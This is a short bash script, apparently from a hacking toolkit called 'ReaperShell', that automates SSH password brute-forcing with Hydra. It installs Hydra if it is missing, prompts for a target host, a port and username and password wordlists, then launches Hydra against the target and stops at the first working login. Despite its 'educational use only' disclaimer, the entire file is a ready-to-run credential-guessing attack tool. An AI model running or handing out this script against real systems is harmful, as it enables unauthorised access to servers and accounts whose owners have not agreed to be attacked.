#!/bin/bash
# ssh_bruteforce.sh - SSH Brute Force Script using Hydra
# Author: KERILL-REDBYTEV
# For educational use only!

clear
echo "============================================"
echo "         ReaperShell - SSH BruteForce"
echo "============================================"

# Check for hydra
if ! command -v hydra &> /dev/null; then
    echo "[!] Hydra not found. Installing..."
    pkg update && pkg install hydra -y
fi

# Input target
read -p "[?] Enter Target IP/Domain: " target
read -p "[?] Enter SSH Port [Default 22]: " port
port=${port:-22}
read -p "[?] Enter username wordlist path: " userlist
read -p "[?] Enter password wordlist path: " passlist

# Validate files
if [ ! -f "$userlist" ]; then
    echo "[!] Userlist file not found: $userlist"
    exit 1
fi
if [ ! -f "$passlist" ]; then
    echo "[!] Password file not found: $passlist"
    exit 1
fi

# Run brute force
echo "[*] Launching brute force attack on $target:$port..."
hydra -L "$userlist" -P "$passlist" -t 4 -f -V ssh://$target:$port

echo
echo "[✓] Attack finished."
read -p "Press ENTER to return to menu..."